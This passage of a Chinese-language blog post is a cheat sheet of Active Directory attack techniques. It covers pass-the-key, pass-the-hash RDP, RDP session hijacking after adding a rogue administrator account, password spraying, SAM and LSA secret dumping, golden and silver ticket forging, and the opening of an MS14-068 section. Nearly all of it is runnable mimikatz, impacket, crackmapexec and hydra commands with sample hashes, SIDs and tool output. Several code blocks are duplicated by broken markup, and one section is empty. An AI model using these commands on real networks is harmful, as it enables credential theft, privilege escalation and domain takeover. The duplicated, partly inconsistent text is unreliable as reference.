+<h2 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h2><p>Kerberos 身份验证协议与票证一起使用以授予访问权限。通过出示 TGT（Ticket Granting Ticket）可以获得服务票证（ST）。可以通过验证名为“预身份验证”的第一步来获得先前的 TGT。预认证要求请求用户提供从用户密码派生的密钥（DES、RC4、AES128 或 AES256）。知道该用户的aes hmac密钥的攻击者不需要知道实际密码即可获得票证，这称为传递密钥，可在NTLM认证被禁止的情况下用来实现类似pth的功能。</p>
+<p><strong>使用mimikatz进行PTK</strong></p>
+<p>获取aes的hmac:</p>
+ <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">mimikatz.exe "privilege::debug" "sekurlsa::ekeys"<br></code></pre></td></tr></table></figure>
+
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815155406191.png" alt="image-20220815155406191" style="zoom:33%;">
+
+<p>获得票据执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 命令执行完后会弹出一个会话，执行IPC链接</span><br>mimikatz.exe "sekurlsa::pth /user:manager /domain:test.com /aes256:4970044a85b68514e8c95328e9ee1885a5c450a15ac7185df7e6a35efdacad4e"<br></code></pre></td></tr></table></figure>
+
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815155656163.png" alt="image-20220815155656163" style="zoom:50%;">
+
+<p><strong>使用impacket工具包进行PTK</strong></p>
+<p>获取aes的hmac:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains python3 secretsdump.py  test.com/manager:&#x27;admin@123&#x27;@192.168.181.130<br></code></pre></td></tr></table></figure>
+
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815155502978.png" alt="image-20220815155502978" style="zoom: 50%;">
+
+<p>生成票据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains python3 getTGT.py -aesKey 4970044a85b68514e8c95328e9ee1885a5c450a15ac7185df7e6a35efdacad4e -dc-ip 192.168.181.130 test.com/manager@192.168.181.128<br></code></pre></td></tr></table></figure>
+
+<p>使用票据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# export KRB5CCNAME=manager@192.168.181.128.ccache; proxychains python3 wmiexec.py -k -no-pass  test.com/manager@192.168.181.128<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="PTH-RDP"><a href="#PTH-RDP" class="headerlink" title="PTH RDP"></a>PTH RDP</h2><p>受kb2871997补丁的影响增加了Restricted Admin RDP模式的远程桌面客户端支持，主要功能是使得凭据不会暴露在目标系统中。</p>
+<p><strong>适用场景</strong> ： 有域中的NTDS Hash，但是解不出密码，又想登陆RDP</p>
+<p><strong>适用系统:</strong></p>
+<ul>
+<li>Windows 8.1和Windows Server 2012 R2默认支持该功能</li>
+<li>Windows 7和Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351</li>
+</ul>
+<p><strong>开启Restricted Admin RDP模式</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f<br>REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin" #查询结果<br></code></pre></td></tr></table></figure>
+
+
+
+<p>使用mimikatz:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs apache"><span class="hljs-attribute">privilege</span>::debug<br><span class="hljs-attribute">sekurlsa</span>::pth /user:administrator /domain:test.com /ntlm:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span>c<span class="hljs-number">59</span>d<span class="hljs-number">7</span>e<span class="hljs-number">0</span>c<span class="hljs-number">089</span>c<span class="hljs-number">0</span> <span class="hljs-string"><code class="language-hljs apache"><span class="hljs-attribute">privilege</span>::debug<br><span class="hljs-attribute">sekurlsa</span>::pth /user:administrator /domain:test.com /ntlm:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span>c<span class="hljs-number">59</span>d<span class="hljs-number">7</span>e<span class="hljs-number">0</span>c<span class="hljs-number">089</span>c<span class="hljs-number">0</span> <span class="hljs-string">"/run:mstsc.exe /restrictedadmin"</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果遇到CredSSP加密数据库错误是大概是因为win10家庭版，可以尝试使用 Server2016</p>
+<p>若遇到 error kuh1_m_sekurlsa_acquireLSA:<code>logon list</code> 错误，请下载最新版<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">mimiketz</a></p>
+</blockquote>
+<p>使用impacket检查hash是否可登陆:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains python3 rdp_check.py test.com/manager@192.168.181.130 -hashes :579da618cfbfa85247acf1f800a280a4<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816003641090.png" alt="image-20220816003641090"></p>
+<h1 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h1><h1 id="RDP-会话劫持"><a href="#RDP-会话劫持" class="headerlink" title="RDP 会话劫持"></a>RDP 会话劫持</h1><p>系统管理员和用户通常可以通过 RDP（远程桌面）协议登录指定服务器3389远程桌面，<code>而攻击者可以通过可以特权提升至 SYSTEM 权限的用户，可以在不知道其他用户登录凭据的情况下，用来劫持其他用户的 RDP 会话</code>，该漏洞在2017年由以色列安全研究员Alexander Korznikov在个人博客中披露。<code>利用条件只需要获取机器system权限执行tscon命令</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre class=" language-hljs shell">net user guest /active:yes<br>net user guest test!@#123<br>net localgroup administrators guest /add<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">net user guest /active:yes<br>net user guest test!@#123<br>net localgroup administrators guest /add<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 如果guest被组策略限制了就再新建个用户</span><br>net user testtest test!@#123 /add<br>net localgroup administrators testtest /add<br></code></pre></td></tr></table></figure>
+
+<p>查看要切换的会话ID</p>
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816012505246.png" alt="image-20220816012505246" style="zoom:50%;">
+
+<blockquote>
+<p>都需要有SYSTEM的权限</p>
+</blockquote>
+<p>使用服务切换</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">sc create rdp binpath= "cmd.exe /k tscon 1 /dest:console"<br>sc qc rdp<br>sc start rdp<br></code></pre></td></tr></table></figure>
+
+<p>使用PSEXEC</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs shell">psexec -accepteula -s -i cmd<br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">psexec -accepteula -s -i cmd<br><span class="hljs-meta">#</span><span class="bash"> 在弹出来的CMD执行下面的语句</span><br>tscon 1 /dest:console<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="密码喷洒-爆破"><a href="#密码喷洒-爆破" class="headerlink" title="密码喷洒/爆破"></a>密码喷洒/爆破</h1><p>避免只针对一个用户进行密码爆破而造成账户锁定，密码喷洒攻击是对所有用户进行爆破，既避免了用户被锁定，同时也提高了用户破解密码的效率。同时，不同于固定用户名对密码进行爆破，密码喷洒攻击是固定密码对用户名进行爆破。</p>
+<p>如果有域账号，则可以导出所有用户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs shell">└─# proxychains python3 samrdump.py test.com/user1:user@123@192.168.181.130 				&gt;users.txt<br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">└─# proxychains python3 samrdump.py test.com/user1:user@123@192.168.181.130 				&gt;users.txt<br><span class="hljs-meta">#</span><span class="bash"> 换个文件写，避免覆盖原文件</span><br>└─# grep &#x27;Found user:&#x27; users.txt | awk -F &#x27;,&#x27; &#x27;&#123;print $1&#125;&#x27;  | sed &#x27;s/Found user://&#x27; >user1.txt<br></code></pre></td></tr></table></figure>
+
+<p>没有可以进行爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">git clone https://github.com/sensepost/UserEnum.git<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>工具推荐：</strong></p>
+<ul>
+<li>kali自带crackmapexec</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs js">└─# proxychains crackmapexec smb <span class="hljs-number">192.168</span><span class="hljs-number">.181</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> -d test.com  -u ./user1.txt -p <span class="hljs-string">&#x27;123456&#x27;</span> --<span class="hljs-keyword"><code class="language-hljs js">└─# proxychains crackmapexec smb <span class="hljs-number">192.168</span><span class="hljs-number">.181</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> -d test.com  -u ./user1.txt -p <span class="hljs-string">&#x27;123456&#x27;</span> --<span class="hljs-keyword">continue</span>-on-success<br></code></pre></td></tr></table></figure>
+
+<p>单用户爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains crackmapexec smb 192.168.181.0/24 -d test.com  -u &#x27;administrator&#x27; -p &#x27;123456&#x27; --continue-on-success  -x whoami --exec-method smbexec<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-x 表示执行命令</p>
+<p>pwn3d! 表示有本地管理权限</p>
+</blockquote>
+<img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220815125041932.png" alt="image-20220815125041932" style="zoom:50%;">
+
+<p>使用hash爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains crackmapexec  smb 192.168.181.0/24   -u &#x27;manager&#x27; -H &#x27;529da644cfbfa85247acaaf800a280a4&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>dump hash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">crackmapexec smb 192.168.181.1 -u &#x27;Administrator&#x27; -p &#x27;PASS&#x27; --local-auth --sam<br></code></pre></td></tr></table></figure>
+
+<p>dump LSA secrets</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">crackmapexec smb 192.168.181.1 -u &#x27;Administrator&#x27; -p &#x27;PASS&#x27; --lsa<br></code></pre></td></tr></table></figure>
+
+
+
+<p>空会话登陆</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">crackmapexec smb 192.168.181.0/24 -u &#x27;&#x27; -p &#x27;&#x27;<br><br>└─# proxychains crackmapexec smb 192.168.181.0/24 -u &#x27;administrator&#x27; -p &#x27;&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>找空密码的smb共享</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains crackmapexec smb 192.168.181.0/24 -u &#x27;administrator&#x27; -p &#x27;&#x27; --shares 	<br></code></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>老牌hydra</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# proxychains hydra -L user1.txt -p &#x27;test@123&#x27; 192.168.181.0/24 smb<br></code></pre></td></tr></table></figure>
+
+
+
+<p>如果没有hash可以进行 弱口令、密码规律枚举</p>
+<h1 id="票据伪造"><a href="#票据伪造" class="headerlink" title="票据伪造"></a>票据伪造</h1><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>Golden Ticket，如果拥有krbtgt账户的Hash，即可制造任意票据访问AD域内的 任意资源。</p>
+<blockquote>
+<p>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2498213a050ded48b21737cfa99b9254:::</p>
+</blockquote>
+<p>黄金票据创建条件：</p>
+<blockquote>
+<p>1、域名称<br>2、域的SID值<br>3、域的KRBTGT账户密码HASH<br>4、伪造用户名，可以是任意的</p>
+</blockquote>
+<p><strong>Impacket创建票据：</strong></p>
+<p>Find the domain SID</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> </span><br>lookupsid.py -hashes &#x27;LMhash:NThash&#x27; &#x27;DOMAIN/DomainUser@DomainController&#x27; 0<br>└─# proxychains python3 lookupsid.py -hashes  :579da618cfbfa85247acf1f800a280a4  test.com/manager@192.168.181.130 0<br>[*] Brute forcing SIDs at 192.168.181.130<br>[*] StringBinding ncacn_np:192.168.181.130[\pipe\lsarpc]<br>[*] Domain SID is: S-1-5-21-3406609810-1123648702-1926310187<br><br></code></pre></td></tr></table></figure>
+
+<p>Create the golden ticket (with an RC4 key, i.e. NT hash)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre class=" language-hljs shell">ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell">ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 这个nthash不需要:</span><br>└─# proxychains python3 ticketer.py -nthash 2498213a050ded48b21737cfa99b9254 -domain-sid S-1-5-21-3406609810-1123648702-1926310187 -domain test.com administrator<br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[*] Creating basic skeleton ticket and PAC Infos<br>[*] Customizing ticket for test.com/abcasdf<br>[*] 	PAC_LOGON_INFO<br>[*] 	PAC_CLIENT_INFO_TYPE<br>[*] 	EncTicketPart<br>[*] 	EncAsRepPart<br>[*] Signing/Encrypting final ticket<br>[*] 	PAC_SERVER_CHECKSUM<br>[*] 	PAC_PRIVSVR_CHECKSUM<br>[*] 	EncTicketPart<br>[*] 	EncASRepPart<br>[*] Saving ticket in administrator.ccache<br><br></code></pre></td></tr></table></figure>
+
+<p>其他方式创建票据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> Create the golden ticket (with an AES 128/256bits key)</span><br>ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Create the golden ticket (with an RC4 key, i.e. NT <span class="hljs-built_in"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> Create the golden ticket (with an AES 128/256bits key)</span><br>ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Create the golden ticket (with an RC4 key, i.e. NT <span class="hljs-built_in">hash</span>) with custom user/groups ids</span><br>ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN -user-id $USERID -groups $GROUPID1,$GROUPID2,... randomuser<br></code></pre></td></tr></table></figure>
+
+<p>使用票据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">└─# export KRB5CCNAME=&#x27;administrator.ccache&#x27;                                                                                                          └─# proxychains python3 wmiexec.py -k -no-pass test.com/administrator@192.168.181.128<br></code></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>注意，[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database) 错误</p>
+<p>如果是frp代理可能需要对DNS、HOST进行设置，推荐VPN代理</p>
+<p>可以尝试在Kali装这个依赖<code>sudo apt install krb5-user</code></p>
+</blockquote>
+<p><strong>mimikatz 和 Rubeus创建票据</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> with an NT <span class="hljs-built_in">hash</span></span><br>kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> with an AES 128 key</span><br>kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> with an NT <span class="hljs-built_in">hash</span></span><br>kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> with an AES 128 key</span><br>kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> with an AES 256 key</span><br>kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt<br></code></pre></td></tr></table></figure>
+
+
+
+<p>具体操作：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 清除票据</span><br>klist purge<br>mimikatz # kerberos::purge<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 生成票据</span><br>mimikatz # kerberos::golden /domain:test.com /sid:S-1-5-21-3406609810-1123648702-1926310187 /krbtgt:2498213a050ded48b21737cfa99b9254 /user:administrator /ticket:administrator.kiribi<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 清除票据</span><br>klist purge<br>mimikatz # kerberos::purge<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 生成票据</span><br>mimikatz # kerberos::golden /domain:test.com /sid:S-1-5-21-3406609810-1123648702-1926310187 /krbtgt:2498213a050ded48b21737cfa99b9254 /user:administrator /ticket:administrator.kiribi<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 导入票据</span><br>mimikatz # kerberos::ptt administrator.kiribi<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816094646812.png" alt="image-20220816094646812"></p>
+<p>直接dir \\机器名\\c$即可</p>
+<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>Sliver Ticket ，如果拥有某个服务账户的Hash，可以伪造该服务的票据用来访问该服务。</p>
+<p>白银票据制作条件：</p>
+<blockquote>
+<p>1、域名称<br>2、域SID<br>3、目标服务器的FQDN（Fully Qualified Domain Name全限定域名，即同时带有主机名和域名的名称。）<br>4、可利用的服务（运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等）<br>5、服务账号的NTLM Hash（如果是域控制器机器账号，那就代表DC已经被拿下了）<br>6、需要伪造的用户名，可以是任意的，这里是silver</p>
+</blockquote>
+<p>SPN:</p>
+<table>
+<thead>
+<tr>
+<th>**Service Type **</th>
+<th><strong>Service Silver Tickets</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WMI</td>
+<td>HOST RPCSS</td>
+</tr>
+<tr>
+<td>PowerShell Remoting</td>
+<td>HOST HTTPDepending on OS version may also need: WSMAN RPCSS</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST HTTP</td>
+</tr>
+<tr>
+<td>Scheduled Tasks</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>Windows File Share (CIFS)</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>LDAP operations including Mimikatz DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows Remote Server Administration Tools</td>
+<td>RPCSS LDAP CIFS</td>
+</tr>
+</tbody></table>
+<p><strong>Impakcet创建票据</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> Find the domain SID</span><br>lookupsid.py -hashes &#x27;LMhash:NThash&#x27; &#x27;DOMAIN/DomainUser@DomainController&#x27; 0<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> with an NT <span class="hljs-built_in">hash</span></span><br>python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> Find the domain SID</span><br>lookupsid.py -hashes &#x27;LMhash:NThash&#x27; &#x27;DOMAIN/DomainUser@DomainController&#x27; 0<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> with an NT <span class="hljs-built_in">hash</span></span><br>python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> with an AES (128 or 256 bits) key</span><br>python ticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username<br></code></pre></td></tr></table></figure>
+
+<p><strong>mimikatz 和 Rubeus创建票据</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> with an NT <span class="hljs-built_in">hash</span></span><br>kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> with an AES 128 key</span><br>kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> with an NT <span class="hljs-built_in">hash</span></span><br>kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> with an AES 128 key</span><br>kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> with an AES 256 key</span><br>kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt<br></code></pre></td></tr></table></figure>
+
+<p><strong>实践：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><span class="hljs-meta">#</span><span class="bash"><code class="language-hljs shell"><span class="hljs-meta">#</span><span class="bash"> 必须是用户名为主机名的Hash 才能制作白银票据</span><br><br>1. 伪造 cifs 服务权限<br>mimikatz "kerberos::golden /domain:test.com /sid:S-1-5-21-3406609810-1123648702-1926310187 /rc4:12e0c6619cdccd69f8fd009c8c3fcfac /user:silver /target:DBSERVER.test.com /services:cifs /ptt" exit<br><br>klist<br>dir \\DBSERVER.test.com\c$<br><br>2. 伪造 LDAP 服务权限<br>mimikatz "kerberos::golden /domain:rootkit.org /sid:S-1-5-21-3759881954-2993291187-3577547808 /target:OWA2013.rootkit.org /service:LDAP /rc4:ddd2162e8606006dcca0e29b7819721a /user:silver /ptt" exit<br>klist<br>mimikatz "lsadump::dcsync /dc:OWA2013.rootkit.org /domain:rootkit.org /user:krbtgt" exit<br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="MS14-068-CVE-2014-6324"><a href="#MS14-068-CVE-2014-6324" class="headerlink" title="MS14-068 (CVE-2014-6324)"></a>MS14-068 (CVE-2014-6324)</h2><p>主要是PAC（域中用来做权限鉴定）的算法缺陷可用来域用户提权，这种攻击类似于金票，但是它不需要攻击者知道<code>krbtgt</code>. </p>
+<p>利用前提：</p>
+<blockquote>
+<p>1.域控没有打MS14-068的补丁(KB3011780)</p>
+<p>2.拿下一台加入域的计算机</p>
+<p>3.有这台域内计算机的域用户密码和Sid</p>
+</blockquote>
+<p>环境需要装域证书服务：</p>
+<p><img src="/2022/08/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93/image-20220816105006531.png" alt="image-20220816105006531"></p>
